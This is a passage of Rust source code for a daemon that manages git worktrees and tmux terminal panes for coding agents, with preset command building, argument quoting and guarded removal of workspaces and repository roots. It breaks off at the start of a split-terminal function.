//! Domain services: the operations a client can invoke.
//!
//! Every read that reports terminal or workspace state DERIVES it from durable
//! intent joined against the live tmux inventory. Nothing here ever reads a
//! stored runtime state, because none exists.

use std::path::{Path, PathBuf};
use std::sync::Arc;

use farcooler_core::{
    DomainError, Result,
    derive::{self, DerivedTerminal},
    inventory::RuntimeInventory,
    validate,
};
use farcooler_protocol::v1::{TerminalIntent, TerminalState, WorkspaceState};
use farcooler_store::{Store, models};
use farcooler_tmux::{LiveInventory, TmuxServer};
use uuid::Uuid;

use crate::runtime::Runtime;
use crate::{agent_supervisor, git, paths, session_discovery};

/// Launch presets. Coding agents run through the user's configured shell so
/// startup files, version managers, direnv, and aliases behave like a
/// hand-launched terminal. The default mode is an interactive login shell.
/// Build the command for a preset.
///
/// A preset may carry a model after a colon — `claude:opus`. Encoded in the
/// preset rather than added as a second field because it travels through the
/// protocol, the CLI, the store and three clients as one string, and every one
/// of those would otherwise need a parallel parameter that is almost always
/// empty.
///
/// The model is validated before it reaches a shell. It is the only part of
/// this that a client supplies freely, and it ends up inside a `-ilc` string.
///
/// `session_id`, when given to a `claude` preset, is declared to the process
/// with `--session-id` rather than left to be discovered later from whichever
/// `.jsonl` file under `~/.claude/projects` turns out to be newest. Only
/// `claude` understands the flag, so every other preset ignores it.
/// The binary that hosts `agent-host`, next to the daemon that is asking.
///
/// NOT `current_exe()`. The daemon is `farcoolerd` and `agent-host` is a
/// subcommand of the `farcooler` CLI — two binaries from one workspace. Using
/// the daemon's own path put `farcoolerd agent-host …` into the pane, where
/// `farcoolerd` ignored the arguments, saw a daemon already listening, and
/// exited 0. The pane then died instantly and the terminal derived as an exit
/// the user never caused, which is the most confusing possible failure: agent
/// mode reported success and left nothing behind.
///
/// A sibling of the daemon rather than whatever is on `PATH`, so a daemon built
/// from this workspace runs the CLI built from this workspace. `PATH` is the
/// fallback for an install that separates them.
pub fn shim_binary(daemon_exe: Option<&std::path::Path>) -> String {
    daemon_exe
        .and_then(|p| p.parent())
        .map(|dir| dir.join("farcooler"))
        .filter(|p| p.exists())
        .map(|p| p.display().to_string())
        .unwrap_or_else(|| "farcooler".to_string())
}

/// Wrap a value so a shell treats it as exactly one word.
///
/// Single quotes, because inside them a shell interprets nothing at all — no
/// variable expansion, no globbing, no command substitution. The only character
/// that needs handling is a single quote itself, which is closed, escaped and
/// reopened.
///
/// This exists for paths that Far Cooler did not choose: a worktree under
/// `~/My Projects` splits into two arguments unquoted, which takes agent mode
/// down entirely for anyone whose directories have spaces in them.
pub fn shell_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', r"'\''"))
}

pub fn preset_command(preset: &str, session_id: Option<&str>) -> String {
    let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/zsh".to_string());
    let (agent, model) = match preset.split_once(':') {
        Some((a, m)) if is_safe_model(m) => (a, Some(m)),
        // A model that is not a plain identifier is dropped, not escaped and
        // not passed on. Nothing legitimate is lost and there is no argument
        // about quoting.
        Some((a, _)) => (a, None),
        None => (preset, None),
    };

    let flag = model.map(|m| format!(" --model {m}")).unwrap_or_default();

    // Declared, not discovered — but it still ends up inside a `-ilc` string,
    // so anything that is not a plain uuid is dropped rather than escaped. The
    // cost of dropping it is one adoption that has to fall back to searching.
    let session = session_id
        .filter(|s| Uuid::parse_str(s).is_ok())
        .map(|s| format!(" --session-id {s}"))
        .unwrap_or_default();

    match agent {
        "shell" => format!("{shell} -il"),
        "claude" => format!("{shell} -ilc 'claude{flag}{session}'"),
        "codex" => format!("{shell} -ilc 'codex{flag}'"),
        "cursor" => format!("{shell} -ilc 'cursor-agent{flag}'"),
        other if is_safe_model(other) => format!("{shell} -ilc '{other}{flag}'"),
        // An unrecognised preset that is not a plain identifier is not run at
        // all. A preset is chosen from a list; anything else is a bug or an
        // attempt.
        _ => format!("{shell} -il"),
    }
}

/// A plain identifier: letters, digits, dot, dash, underscore.
///
/// Deliberately narrower than what a shell would accept. Every real model name
/// fits, and nothing that fits can end a quoted string.
fn is_safe_model(text: &str) -> bool {
    !text.is_empty()
        && text.len() <= 64
        && text
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.')
}

/// Agents Far Cooler can render natively.
///
/// One entry, honestly. `crates/cli`'s `default_adapter` speaks to Claude Code
/// and nothing else, so this list is the truth about what chat mode can do —
/// and the place to add to when a second adapter exists, rather than
/// discovering the gap as a pane that renders the wrong agent.
const CHAT_CAPABLE: &[&str] = &["claude"];

/// Directories the `@`-mention picker never walks.
///
/// Build output and caches, which nobody mentions and which dwarf the tree they
/// sit in — a Swift package's `.build` alone contributed hundreds of
/// `index/store/v5/units/…` entries, so an unfiltered `@` filled its list with
/// object files before reaching a single source file.
///
/// A denylist rather than reading `.gitignore`, deliberately: an untracked file
/// the agent just created is exactly the one a user wants to mention next, so
/// honouring ignore rules would hide the best answers.
const SKIP_DIRS: &[&str] = &[
    ".git",
    ".build",
    ".next",
    ".venv",
    "__pycache__",
    "build",
    "dist",
    "node_modules",
    "target",
    "vendor",
    "venv",
];


/// Whether Far Cooler can render this agent as a chat.
pub fn chat_capable(harness: &str) -> bool {
    CHAT_CAPABLE.contains(&harness)
}

pub struct Service {
    pub store: Store,
    pub tmux: TmuxServer,
    pub inventory: LiveInventory,
    pub host_id: Uuid,
    /// Where this service's runtime data lives.
    ///
    /// Held rather than re-derived from `FARCOOLER_HOME` at each use. The
    /// environment is process-global, so a service that consulted it on every
    /// call could be moved out from under itself — which is exactly what
    /// happens when two tests run in parallel, and would happen in production
    /// the first time anything set the variable after startup.
    root: PathBuf,
    /// Every terminal's agent session: activity, cursor, and the fast-attach
    /// event window. See `agent_supervisor` for why the transcript itself is
    /// not here.
    agents: agent_supervisor::AgentSupervisor,
    /// One mutex per repository, created on first use and never removed.
    ///
    /// Held across any sequence that mutates git and then writes a workspace
    /// row. `create_workspace` runs `git worktree add` and then inserts; the
    /// reconciler lists worktrees and then adopts what has no row. Without
    /// this, a reconcile landing between those two halves sees a worktree with
    /// no row, adopts it under the directory name, and the original call then
    /// inserts a second row for the same path.
    ///
    /// `git.rs` has claimed since it was written that creation "is serialized
    /// per repository". It was not; nothing depended on it until the reconciler
    /// existed.
    ///
    /// Never pruned. A `Mutex<()>` is two words, repositories are counted in
    /// tens, and a registry that removes entries has to prove nobody is waiting
    /// on the one it is removing.
    repo_locks: std::sync::Mutex<std::collections::HashMap<Uuid, Arc<tokio::sync::Mutex<()>>>>,
}

/// A workspace plus its derived state and terminals.
#[derive(Debug)]
pub struct WorkspaceView {
    pub workspace: models::Workspace,
    pub state: WorkspaceState,
    pub terminals: Vec<TerminalView>,
}

#[derive(Debug)]
pub struct TerminalView {
    pub terminal: models::Terminal,
    pub derived: DerivedTerminal,
}

impl TerminalView {
    pub fn state(&self) -> TerminalState {
        self.derived.state
    }
}

impl Service {
    /// Open the service at the user's runtime directory.
    pub async fn open() -> Result<Self> {
        Self::open_in(paths::ensure_runtime_dir()?).await
    }

    /// Open the service at an explicit directory.
    ///
    /// The environment is read once, at the edge, so nothing below this point
    /// depends on a process-global that another thread can change.
    pub async fn open_in(root: PathBuf) -> Result<Self> {
        let install_id = paths::load_or_create_install_id_in(&root)?;
        let store = Store::open(root.join("farcooler.db"))?;

        // The daemon identity is stable per install, so tags written by a prior
        // run of this same daemon remain provable after a restart.
        let host_id = stable_host_id(&install_id);
        let tmux = TmuxServer::new(&install_id, host_id);
        let inventory = LiveInventory::new(tmux.clone());
        inventory.refresh().await;

        Ok(Self {
            store,
            tmux,
            inventory,
            host_id,
            root,
            agents: agent_supervisor::AgentSupervisor::new(),
            repo_locks: std::sync::Mutex::new(std::collections::HashMap::new()),
        })
    }

    /// The supervisor for every terminal's agent session.
    pub fn agents(&self) -> &agent_supervisor::AgentSupervisor {
        &self.agents
    }

    /// The lock guarding one repository's git-plus-metadata sequences.
    pub fn repo_lock(&self, repository_id: Uuid) -> Arc<tokio::sync::Mutex<()>> {
        // A std mutex, not a tokio one: this holds only long enough to clone an
        // Arc out of a map, and awaiting to look up a lock would be a lock to
        // reach a lock.
        let mut locks = self.repo_locks.lock().unwrap_or_else(|e| e.into_inner());
        Arc::clone(locks.entry(repository_id).or_default())
    }

    /// Where managed worktrees are created, one directory per workspace.
    fn worktrees_dir(&self) -> Result<PathBuf> {
        let dir = self.root.join("worktrees");
        std::fs::create_dir_all(&dir).map_err(|_| DomainError::OperationFailed)?;
        Ok(dir)
    }

    // ---- repository roots ----

    /// Add an allowlisted repository root.
    ///
    /// Canonicalizes, rejects a path that is not an existing directory, rejects
    /// nesting inside or containing an existing root, and rejects sensitive
    /// locations. Adding a root does not scan or register anything inside it.
    pub async fn add_root(&self, path: &Path) -> Result<models::RepositoryRoot> {
        let canonical = path.canonicalize().map_err(|_| DomainError::InvalidArgument {
            what: "path does not exist",
        })?;
        if !canonical.is_dir() {
            return Err(DomainError::InvalidArgument { what: "not a directory" });
        }
        reject_sensitive_root(&canonical)?;

        for existing in self.store.list_repository_roots()? {
            let e = PathBuf::from(&existing.path);
            if canonical.starts_with(&e) || e.starts_with(&canonical) {
                return Err(DomainError::PathNotAllowed);
            }
        }

        self.store.create_repository_root(
            self.host_id,
            &canonical.to_string_lossy(),
            now_millis(),
        )
    }

    pub fn list_roots(&self) -> Result<Vec<models::RepositoryRoot>> {
        self.store.list_repository_roots()
    }

    /// Every repository path must sit inside an allowlisted root.
    fn root_for(&self, path: &Path) -> Result<models::RepositoryRoot> {
        self.store
            .list_repository_roots()?
            .into_iter()
            .find(|r| path.starts_with(&r.path))
            .ok_or(DomainError::PathNotAllowed)
    }

    // ---- repositories ----

    pub async fn register_repository(&self, path: &Path) -> Result<models::Repository> {
        let canonical = path
            .canonicalize()
            .map_err(|_| DomainError::InvalidArgument { what: "path does not exist" })?;
        let root = self.root_for(&canonical)?;

        let git_dir = git::validate_repository(&canonical).await?;
        let display_name = canonical
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_else(|| "repository".to_string());
        validate::display_name(&display_name)?;

        let remote = git::remote_summary(&canonical).await;

        let repository = self.store.create_repository(
            self.host_id,
            root.id,
            &display_name,
            &git_dir.to_string_lossy(),
            &remote,
        )?;

        // Synchronously, before returning: adding a project should fill the
        // sidebar by the time the sheet closes, not a tick later. A failure
        // here is logged rather than propagated — the repository IS registered,
        // and the next tick reconciles it anyway.
        if let Err(e) = crate::reconcile::repository(self, repository.id).await {
            tracing::warn!(error = ?e, "could not reconcile a freshly registered repository");
        }

        Ok(repository)
    }

    pub fn list_repositories(&self) -> Result<Vec<models::Repository>> {
        let mut all = Vec::new();
        for root in self.store.list_repository_roots()? {
            all.extend(self.store.list_repositories_for_root(root.id)?);
        }
        Ok(all)
    }

    /// The working tree for a registered repository.
    ///
    /// `canonical_git_dir` is the `.git` directory, so the working tree is its
    /// parent for an ordinary non-bare repository.
    pub fn repository_worktree(&self, repo: &models::Repository) -> PathBuf {
        let git_dir = PathBuf::from(&repo.canonical_git_dir);
        git_dir.parent().map(|p| p.to_path_buf()).unwrap_or(git_dir)
    }

    // ---- workspaces ----

    /// Create a workspace: one worktree plus branch for one task.
    ///
    /// Git succeeds before any metadata is written. If metadata then fails, the
    /// newly created clean worktree and unpushed branch are rolled back, and a
    /// dirty one is preserved instead.
    pub async fn create_workspace(
        &self,
        repository_id: Uuid,
        task_name: &str,
        branch: &str,
        base_revision: &str,
    ) -> Result<models::Workspace> {
        validate::task_name(task_name)?;
        validate::branch_name(branch)?;

        // Held until this function returns: everything below is "mutate git,
        // then write the row", and the reconciler must not see the gap.
        let lock = self.repo_lock(repository_id);
        let _guard = lock.lock().await;

        let repo = self.store.get_repository(repository_id)?;
        let repo_path = self.repository_worktree(&repo);

        let dest = self.worktrees_dir()?.join(format!(
            "{}-{}",
            sanitize(&repo.display_name),
            sanitize(task_name)
        ));

        let base_commit = git::resolve_revision(&repo_path, base_revision).await?;
        git::create_worktree(&repo_path, branch, base_revision, &dest).await?;

        match self.store.create_workspace(
            repository_id,
            task_name,
            branch,
            &dest.to_string_lossy(),
            false,
        ) {
            Ok(ws) => Ok(ws),
            Err(e) => {
                // Do not erase a possibly valuable worktree to make the database
                // look clean. Roll back only what is provably safe.
                let removed = git::rollback_worktree(&repo_path, branch, &dest, &base_commit)
                    .await
                    .unwrap_or(false);
                tracing::warn!(rolled_back = removed, "workspace metadata failed after git");
                Err(e)
            }
        }
    }

    /// Branches in a repository that work could be resumed on.
    pub async fn list_branches(&self, repository_id: Uuid) -> Result<Vec<git::BranchInfo>> {
        let repo = self.store.get_repository(repository_id)?;
        git::list_branches(&self.repository_worktree(&repo)).await
    }

    /// Every worktree git reports for a repository.
    ///
    /// A diagnostic view for `worktree.list`, a host-admin surface — not a
    /// list of candidates for a client to act on. Task 4's reconciler adopts
    /// every worktree it sees automatically, main checkout included, so
    /// "not yet registered" stopped being a meaningful filter: everything git
    /// reports either already has a workspace row or will on the next tick.
    pub async fn discover_worktrees(&self, repository_id: Uuid) -> Result<Vec<git::WorktreeInfo>> {
        let repo = self.store.get_repository(repository_id)?;
        let repo_path = self.repository_worktree(&repo);
        git::list_worktrees(&repo_path).await
    }

    /// Create a workspace on a branch that already exists.
    ///
    /// The other half of `create_workspace`. Work arrives on a branch as often
    /// as it starts on one: pushed from another machine, handed over by someone
    /// else, or produced by an agent running somewhere else entirely. Without
    /// this, picking that work up meant doing it by hand outside Far Cooler and
    /// then having Far Cooler not know about it.
    pub async fn adopt_branch(
        &self,
        repository_id: Uuid,
        task_name: &str,
        branch: &str,
    ) -> Result<models::Workspace> {
        validate::task_name(task_name)?;
        validate::branch_name(branch)?;

        // Held until this function returns: everything below is "mutate git,
        // then write the row", and the reconciler must not see the gap.
        let lock = self.repo_lock(repository_id);
        let _guard = lock.lock().await;

        let repo = self.store.get_repository(repository_id)?;
        let repo_path = self.repository_worktree(&repo);

        let dest = self.worktrees_dir()?.join(format!(
            "{}-{}",
            sanitize(&repo.display_name),
            sanitize(task_name)
        ));

        git::create_worktree_from_branch(&repo_path, branch, &dest).await?;

        match self.store.create_workspace(
            repository_id,
            task_name,
            branch,
            &dest.to_string_lossy(),
            false,
        ) {
            Ok(workspace) => Ok(workspace),
            Err(e) => {
                // The worktree exists but nothing records it. Remove it —
                // carefully, and never the branch, which was not ours to make.
                let _ = git::git(
                    &repo_path,
                    &["worktree", "remove", &dest.to_string_lossy()],
                )
                .await;
                Err(e)
            }
        }
    }

    pub fn list_workspaces(&self) -> Result<Vec<models::Workspace>> {
        let mut all = Vec::new();
        for repo in self.list_repositories()? {
            all.extend(self.store.list_workspaces_for_repository(repo.id)?);
        }
        Ok(all)
    }

    /// Take a workspace out of the main list. Never changes git data.
    ///
    /// Deliberately unconditional. Its predecessor refused while a managed
    /// terminal was running, which fit "archive" — a lifecycle step meaning
    /// done with this — and does not fit hiding, which is a view preference.
    /// A view preference that fails with an error reads as a bug.
    ///
    /// The risk that refusal guarded is real: hide a worktree and its running
    /// agent stops being visible. It is handled where it belongs, in the
    /// sidebar, whose `Hidden (n)` header carries an attention dot when
    /// anything inside it wants the user.
    pub async fn hide_workspace(&self, id: Uuid) -> Result<models::Workspace> {
        let ws = self.store.get_workspace(id)?;
        if ws.hidden {
            return Ok(ws);
        }
        self.store.set_workspace_flags(id, ws.resource_version, true, ws.worktree_missing)
    }

    /// Delete a terminal's record.
    ///
    /// For a terminal that is already gone: its command exited and there is
    /// nothing left to show. Refused while one is still live, because removing
    /// the record of a running process would orphan it — it would keep running
    /// inside tmux with nothing left that knows it exists.
    pub async fn remove_terminal(&self, id: Uuid) -> Result<()> {
        let record = self.store.get_terminal(id)?;
        let derived = self.derive_one(&record);
        if matches!(derived.state, TerminalState::Running | TerminalState::Starting) {
            return Err(DomainError::RunningProcesses);
        }

        // Take the retained dead pane with it. `remain-on-exit` keeps one so a
        // clean exit is distinguishable from a loss; once the record is gone
        // there is nothing left for it to prove.
        //
        // Nothing else to clean up: the layout IS the panes, so killing the pane
        // removes it from the arrangement, and tmux collapses the split. The old
        // model needed a separate step here to stop a stored group pointing at a
        // terminal that no longer existed.
        let _ = self.kill_pane(id).await;
        self.store.delete_terminal(id, record.resource_version)
    }

    /// Bring a hidden workspace back into the main list.
    ///
    /// Hiding never touched git, so this never has to reconstruct anything. If
    /// the worktree went away while it was hidden the reconciler has already
    /// said so, and the row comes back carrying that fact rather than pretending
    /// otherwise.
    pub async fn unhide_workspace(&self, id: Uuid) -> Result<models::Workspace> {
        let ws = self.store.get_workspace(id)?;
        if !ws.hidden {
            return Ok(ws);
        }
        self.store.set_workspace_flags(id, ws.resource_version, false, ws.worktree_missing)
    }

    /// Stop allowing Far Cooler to operate under a directory.
    ///
    /// Refused while any task workspace under this root is still live, because
    /// a root is the thing that makes those workspaces legal: removing it while
    /// they exist would leave records Far Cooler can no longer act on. Hidden
    /// workspaces do not block it — they are already out of the way — and
    /// nothing on disk is touched either way.
    ///
    /// Every refusal is checked before anything is deleted, and every
    /// repository's `repo_lock` is held for the whole function, acquired
    /// before the first check. `reconcile::repository` takes the identical
    /// lock and Task 5 runs it on a ticker; without holding it here, a
    /// reconcile could insert a workspace row between the checks below and the
    /// deletes, reproducing the FK violation this function exists to avoid.
    /// That lock is what closes THAT race, specifically — it says nothing
    /// about `terminal.create` or a pane going live through tmux directly,
    /// neither of which takes `repo_lock`. So the delete loop below is safe
    /// against a repository gaining a workspace out from under it, but not
    /// airtight against a terminal's state changing in the vanishingly narrow
    /// window between the running check and its own delete; `remove_terminal`
    /// would refuse that one on the spot rather than silently drop it, and the
    /// caller sees the same `RunningProcesses` it would have seen a moment
    /// earlier.
    pub async fn remove_root(&self, id: Uuid) -> Result<models::RepositoryRoot> {
        let root = self.store.get_repository_root(id)?;
        let repositories = self.store.list_repositories_for_root(id)?;

        // Held until this function returns. `repo_locks` outlives `_guards`
        // (declared first, so dropped last), which is what lets each guard
        // borrow its own lock for the whole function body.
        let repo_locks: Vec<_> = repositories.iter().map(|r| self.repo_lock(r.id)).collect();
        let mut _guards = Vec::with_capacity(repo_locks.len());
        for lock in &repo_locks {
            _guards.push(lock.lock().await);
        }

        let mut all_workspaces: Vec<models::Workspace> = Vec::new();
        for repository in &repositories {
            all_workspaces.extend(self.store.list_workspaces_for_repository(repository.id)?);
        }

        // Refused while ANY task workspace remains, hidden or not.
        //
        // The design's rule was "refused while non-hidden workspaces exist",
        // which is the right instinct but leaves a gap: a hidden workspace
        // still has a worktree directory on disk. Deleting its record with the
        // root would strand that directory somewhere Far Cooler is no longer
        // allowed to touch, so it could never be cleaned up. Removing the
        // worktree already deletes the record, so "remove the worktrees first"
        // is a reachable instruction rather than a dead end.
        //
        // The main checkout is excluded from this count. Since the reconciler
        // adopts it the moment a repository is registered, counting it here
        // would make every registered repository's root permanently
        // unremovable — there is no worktree to "remove" to clear it, because
        // `remove_worktree` refuses the main checkout on purpose. Its worktree
        // is the directory the user already owns and manages themselves;
        // de-registering the root touches no disk either way, main checkout
        // included, so there is nothing here for it to strand.
        let remaining = all_workspaces.iter().filter(|w| !w.is_main_checkout).count();
        if remaining > 0 {
            return Err(DomainError::WorkspacesExist);
        }

        // Refused outright if the tmux inventory cannot be trusted at all.
        // `derive_terminal` reports EVERY terminal as `Lost` when the inventory
        // is unhealthy (`crates/core/src/derive.rs`), which would otherwise let
        // a momentarily unreachable tmux server sail straight past the running
        // check below and delete the only record of a process that may still
        // be alive — exactly what `remove_terminal`'s own guard exists to
        // prevent.
        if !self.inventory_snapshot().inventory_healthy {
            return Err(DomainError::TmuxUnavailable);
        }

        // Refused while any terminal anywhere under this root — main checkout
        // included — is running OR starting. `Running | Starting`, matching
        // `remove_terminal` exactly rather than the narrower `Running` alone:
        // a terminal mid-launch is exactly as alive as one already confirmed.
        // `RunningProcesses` is the same vocabulary `remove_terminal` and
        // `remove_worktree` already use for "something is alive under here",
        // and a stopped-but-recorded terminal does not qualify.
        for ws in &all_workspaces {
            let view = self.workspace_view(ws).await?;
            if view
                .terminals
                .iter()
                .any(|t| matches!(t.state(), TerminalState::Running | TerminalState::Starting))
            {
                return Err(DomainError::RunningProcesses);
            }
        }

        // Deleted in foreign-key order: terminals, then workspaces, then
        // repositories, then the root. Terminals go through `remove_terminal`
        // rather than a second hand-rolled deletion path beside it, so the
        // pane `remain-on-exit` retains for an already-exited terminal is
        // killed along with the record — left to a bare `delete_terminal` it
        // would be orphaned in tmux with nothing left that knows about it.
        for ws in &all_workspaces {
            for term in self.store.list_terminals_for_workspace(ws.id)? {
                self.remove_terminal(term.id).await?;
            }
        }
        for ws in &all_workspaces {
            self.store.delete_workspace(ws.id, ws.resource_version)?;
        }
        // The repositories go with it. They exist only as members of a root,
        // and leaving them behind would strand rows pointing at nothing.
        for repository in repositories {
            self.store.delete_repository(repository.id, repository.resource_version)?;
        }
        self.store.delete_repository_root(id, root.resource_version)?;
        Ok(root)
    }

    /// Whether removing this worktree should demand its name typed out.
    ///
    /// Only when there is uncommitted or untracked work in it. Everything
    /// committed survives in the branch, which removal never touches, so a
    /// clean worktree is recoverable by re-adding it.
    ///
    /// Demanding the name every time is worse than demanding it sometimes:
    /// people type it without reading it, and then the one gesture meant to
    /// stop a mistake is the mistake's accomplice.
    ///
    /// A worktree whose directory is already gone is not dirty and cannot be
    /// inspected, so it needs no confirmation either — there is nothing left
    /// to lose.
    pub async fn removal_needs_confirmation(&self, id: Uuid) -> Result<bool> {
        let ws = self.store.get_workspace(id)?;
        if !std::path::Path::new(&ws.worktree_path).is_dir() {
            return Ok(false);
        }
        // A worktree we cannot inspect is treated as dirty. Guessing "clean"
        // here would skip the confirmation on exactly the repositories where
        // something is already wrong.
        Ok(git::is_dirty(std::path::Path::new(&ws.worktree_path)).await.unwrap_or(true))
    }

    /// Remove a workspace's worktree.
    ///
    /// The most destructive action in the product. Refused while any managed
    /// terminal is running OR starting, matching `remove_terminal` exactly —
    /// a terminal mid-launch is exactly as alive as one already confirmed.
    /// Also refused outright when the tmux inventory cannot be trusted at
    /// all: `derive_terminal` reports EVERY terminal as `Lost` when the
    /// inventory is unhealthy (`crates/core/src/derive.rs`), which would
    /// otherwise let a momentarily unreachable tmux server sail straight past
    /// the running check and delete the directory out from under a process
    /// that may still be alive — exactly what `remove_root`'s identical guard
    /// exists to prevent.
    ///
    /// It never deletes the branch: git history and anything pushed survive
    /// untouched. A dirty worktree still requires the caller to have
    /// confirmed, decided by `removal_needs_confirmation`.
    pub async fn remove_worktree(&self, id: Uuid) -> Result<()> {
        let ws = self.store.get_workspace(id)?;
        let repo = self.store.get_repository(ws.repository_id)?;
        let repo_path = self.repository_worktree(&repo);

        // Never the repository's own checkout. The flag comes from git's own
        // worktree list, so this does not depend on a path comparison
        // agreeing with however the repository was registered.
        if ws.is_main_checkout {
            return Err(DomainError::InvalidArgument { what: "the main checkout" });
        }

        // A second, independent check of the same fact, kept alongside the
        // flag rather than in place of it. Migration 0006 added
        // `is_main_checkout` with `DEFAULT 0`, so on any database written
        // before this feature existed the main checkout's row says it is an
        // ordinary worktree until `reconcile::repository` runs and heals it
        // -- and the flag can end up wrong for other reasons a future bug
        // might introduce, too. Comparing paths directly means this refusal
        // never depends on that flag having been correct, so the only thing
        // standing between a stale row and deleting the directory the user
        // works in is never just git's own refusal to remove its primary
        // working tree -- which is precisely the safety net this check
        // exists to not rely on.
        if canonical_or_raw(&ws.worktree_path) == canonical_or_raw(&repo_path.to_string_lossy()) {
            return Err(DomainError::InvalidArgument { what: "the main checkout" });
        }

        // Refused outright if the tmux inventory cannot be trusted at all.
        // Must come before the running check below, since an unhealthy
        // inventory is exactly what would make that check lie.
        if !self.inventory_snapshot().inventory_healthy {
            return Err(DomainError::TmuxUnavailable);
        }

        let view = self.workspace_view(&ws).await?;
        if view
            .terminals
            .iter()
            .any(|t| matches!(t.state(), TerminalState::Running | TerminalState::Starting))
        {
            return Err(DomainError::RunningProcesses);
        }

        let lock = self.repo_lock(repo.id);
        let _guard = lock.lock().await;

        let dest = PathBuf::from(&ws.worktree_path);

        let out = git::git(
            &repo_path,
            &["worktree", "remove", "--force", &dest.to_string_lossy()],
        )
        .await?;

        if !out.ok {
            tracing::warn!(stderr = %out.stderr, "worktree remove failed");
            return Err(DomainError::OperationFailed);
        }

        // The workspace record goes with the worktree; the BRANCH stays.
        self.store.delete_workspace(id, ws.resource_version)
    }

    // ---- terminals ----

    /// Create a terminal: a tagged tmux window running the preset.
    pub async fn create_terminal(
        &self,
        workspace_id: Uuid,
        title: &str,
        command_preset: &str,
    ) -> Result<models::Terminal> {
        validate::display_name(title)?;
        validate::command_preset(command_preset)?;

        let ws = self.store.get_workspace(workspace_id)?;

        // 1. Commit the durable record with intent RUNNING, unconfirmed.
        let term = self.store.create_terminal(
            workspace_id,
            title,
            command_preset,
            TerminalIntent::Running,
            120,
            40,
        )?;

        // A claude terminal gets its session id now, so that adopting it into
        // agent pane mode later is exact.
        let declared = command_preset.starts_with("claude").then(|| Uuid::now_v7().to_string());
        let term = if let Some(ref sid) = declared {
            self.store.set_pane_mode(
                term.id,
                term.resource_version,
                models::PaneMode::Terminal,
                Some(sid.clone()),
            )?
        } else {
            term
        };

        // 2. Create and tag the window.
        let command = preset_command(command_preset, declared.as_deref());
        let created = self
            .tmux
            .create_terminal_window(workspace_id, term.id, title, &ws.worktree_path, &command)
            .await;

        if let Err(e) = created {
            // Creation never established a live runtime.
            let _ = self.store.update_terminal(
                term.id,
                term.resource_version,
                terminal_update(&term, |u| u.intent = TerminalIntent::Failed),
            );
            return Err(e);
        }

        // 3. Verify exact tags on a live pane through a fresh query.
        let snapshot = self.inventory.refresh().await;
        let proved = snapshot.claimants(term.id).iter().any(|p| p.proves_life());

        if proved {
            // 4. Only now is the runtime confirmed.
            return self.store.update_terminal(
                term.id,
                term.resource_version,
                terminal_update(&term, |u| u.runtime_confirmed = true),
            );
        }

        // Verification failed. Leave the record and its intent in place: the
        // derivation reports it truthfully until the user resolves it.
        tracing::warn!(terminal = %term.id, "created window did not verify");
        Ok(term)
    }

    /// Whether this pane has an agent in it that Far Cooler can host as a chat.
    ///
    /// Adoption only makes sense for a pane that IS an agent — a shell has no
    /// conversation to continue, and letting one adopt a session is how a
    /// terminal ends up showing somebody else's transcript.
    ///
    /// Narrowed from "any agent" to "a chat-capable one" deliberately, though
    /// the two questions are not the same and it is worth saying why they share
    /// an answer here: the only thing this gates is adopting a CLAUDE session
    /// id (`discover_claude_session`), and Claude is the only harness with an
    /// adapter. If a second one ever ships, this splits back into two
    /// questions.
    ///
    /// Screen as well as process name, for the reason `activity::identify`
    /// exists: Claude Code renames itself to its version, so `2.1.220` is an
    /// agent that process matching alone would never find.
    async fn pane_runs_an_agent(&self, id: Uuid) -> bool {
        let snapshot = self.inventory.snapshot();
        let Some(pane) = snapshot.panes.iter().find(|p| p.terminal_id == id) else {
            return false;
        };
        let screen = self.screen(id).await.map(|(text, _, _)| text).unwrap_or_default();
        // Supported, not merely recognised. Offering chat for an agent that
        // would be replaced by a different one on arrival is how the offer
        // becomes a trap.
        farcooler_core::activity::identify(&pane.command, &screen)
            .is_some_and(|rules| chat_capable(rules.preset))
    }

    /// Re-open a socket for every terminal already in agent pane mode.
    ///
    /// A daemon restart must not cost a conversation. The shims survived it —
    /// they live in tmux panes, which is the whole reason they are there — and
    /// they are sitting in their reconnect loop. Without this they dial a
    /// socket nobody is listening on, forever, and every agent pane goes
    /// permanently silent after the first daemon restart while still looking
    /// perfectly healthy.
    pub fn resume_agent_listeners(&self) {
        let Ok(workspaces) = self.list_workspaces() else { return };
        for ws in workspaces {
            let Ok(terminals) = self.store.list_terminals_for_workspace(ws.id) else { continue };
            for t in terminals.iter().filter(|t| t.pane_mode == models::PaneMode::Agent) {
                self.agents.ensure_listening(&self.root, t.id);
            }
        }
    }

    /// Write an agent's own name for its conversation into the record.
    ///
    /// The supervisor learns this from `session_info_update` and keeps it in
    /// memory, which is right for something the agent revises as it works — and
    /// wrong as the only copy. A daemon restart dropped it, so a pane that had
    /// been "Complete D17 authorization decision" reverted to "claude" and
    /// stayed there until the agent happened to rename the session again.
    ///
    /// Only ever an upgrade, and only over a placeholder or a previous agent
    /// title: a name a PERSON gave a terminal is not something an agent gets to
    /// overwrite.
    pub fn remember_agent_title(&self, id: Uuid, title: &str) {
        let Ok(term) = self.store.get_terminal(id) else { return };
        if term.title == title {
            return;
        }
        let ours = term.title.starts_with("Terminal ") || term.title == "Terminal";
        if !ours && !term.title.is_empty() && term.pane_mode != models::PaneMode::Agent {
            return;
        }
        let _ = self.store.update_terminal(
            id,
            term.resource_version,
            terminal_update(&term, |u| u.title = title.to_string()),
        );
    }

    pub async fn backfill_pane_tags(&self) {
        let Ok(panes) = self.tmux.list_tagged_panes().await else { return };
        let mut repaired = 0;
        for pane in panes.iter().filter(|p| p.daemon_id == self.tmux.daemon_id()) {
            if self.tmux.tag_pane_public(&pane.pane_id, pane.terminal_id).await.is_ok() {
                repaired += 1;
            }
        }
        if repaired > 0 {
            tracing::info!(panes = repaired, "pinned pane identity");
        }
    }

    /// A new terminal in an existing layout, beside a pane already there.
    ///
    /// The same act as `create_terminal` except for where the pane lands: a split
    /// of an existing one rather than a window of its own. That difference is the
    /// whole of `%`, `"`, and dropping something on a pane's edge.
    ///
    /// Deliberately shares the create-then-verify order with `create_terminal`:
    /// the durable record goes in first with intent RUNNING and unconfirmed, the
    /// pane is made, and only a fresh query proving a live tagged pane marks it
    /// confirmed. A split that fails leaves a record the derivation reports
    /// honestly rather than one that claims to be running.
    pub async fn split_terminal(
        &self,
        workspace_id: Uuid,
        target: Uuid,
        side: farcooler_protocol::v1::SplitSide,
        title: &str,
        command_preset: &str,
    ) -> Result<models::Terminal> {
